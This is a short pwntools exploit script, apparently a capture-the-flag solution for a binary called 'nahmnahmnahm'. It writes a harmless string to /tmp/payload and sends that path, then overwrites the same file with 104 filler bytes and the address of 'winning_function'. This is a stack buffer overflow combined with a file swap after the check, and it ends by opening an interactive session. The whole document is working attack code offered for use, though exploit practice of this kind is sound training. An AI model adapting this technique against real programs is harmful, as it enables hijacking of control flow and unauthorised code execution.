from pwn import *

io = process('./nahmnahmnahm')
# io = process('/home/user/nahmnahmnahm')
elf = context.binary = ELF('./nahmnahmnahm')
# elf = context.binary = ELF('/home/user/nahmnahmnahm')

f = open("/tmp/payload", "w") 
f.write("w1n_gl0ry")
f.close()

io.sendline(b"/tmp/payload")

payload = b"A"*104
payload += p64(elf.symbols['winning_function'])

f = open("/tmp/payload", "wb") 
f.write(payload)
f.close()

io.sendline(b"")
io.interactive() 